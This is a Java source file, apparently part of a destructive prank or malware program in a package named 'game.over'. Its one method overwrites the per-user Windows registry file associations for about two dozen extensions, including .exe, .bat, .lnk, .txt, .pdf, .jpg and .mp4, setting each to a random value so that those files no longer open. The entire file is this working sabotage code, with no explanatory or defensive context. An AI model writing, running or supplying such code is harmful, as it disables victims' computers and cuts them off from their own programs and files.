package game.over;

import java.security.SecureRandom;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;

public class regedit {
    public static void init() {
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".exe");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".msi");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".zip");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".vbs");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".bat");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".dll");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".reg");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".jar");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".java");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".kt");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".lnk");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".htm");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".html");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".ini");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".txt");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".log");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".doc");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".docx");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".json");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".pdf");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".png");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".gif");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".jpeg");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".jpg");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".mp3");
        Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Classes", ".mp4");

        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.exe", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.msi", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.zip", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.vbs", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.bat", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.dll", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.reg", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.jar", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.java", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.kt", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.lnk", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.htm", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.html", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.ini", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.txt", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.log", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.doc", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.docx", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.pdf", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.json", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.png", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.gif", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.jpeg", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.jpg", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.mp3", "", String.valueOf(new SecureRandom().nextInt()));
        Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Classes\\.mp4", "", String.valueOf(new SecureRandom().nextInt()));
    }
}
